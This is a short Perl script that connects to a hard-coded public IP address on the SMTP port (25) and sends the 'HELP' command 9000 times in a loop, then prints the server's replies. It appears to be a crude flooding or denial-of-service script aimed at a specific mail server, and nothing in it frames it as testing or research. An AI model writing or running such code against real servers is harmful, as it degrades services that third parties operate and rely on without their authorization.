#!/usr/bin/perl
#lortekode 
use IO::Socket;

$sock = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"194.79.31.225", PeerPort=>"25")
or die "Connection error\n";

$count=0;

while ($count < 9000){

print $sock "HELP\r\n";

$count++;
}

while ($answer = <$sock>) {
	print $answer;
}
close($sock);

